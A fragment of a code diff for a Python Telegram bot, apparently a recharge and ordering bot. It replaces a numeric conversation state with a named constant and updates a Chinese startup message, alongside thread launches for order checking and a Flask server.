-        states={1: [MessageHandler(Filters.text & ~Filters.command, recharge_amount)]},
+        states={RECHARGE_AMOUNT: [MessageHandler(Filters.text & ~Filters.command, recharge_amount)]},
         fallbacks=[CommandHandler('cancel', cancel)]
     ))
 
@@ -828,7 +836,7 @@ def main():
     threading.Thread(target=check_orders, daemon=True).start()
     threading.Thread(target=run_flask, daemon=True).start()
 
-    print("🤖 机器人已启动（最终版-参考源码修复）")
+    print("🤖 机器人已启动（最终完整版）")
     updater.start_polling()
     updater.idle()
 
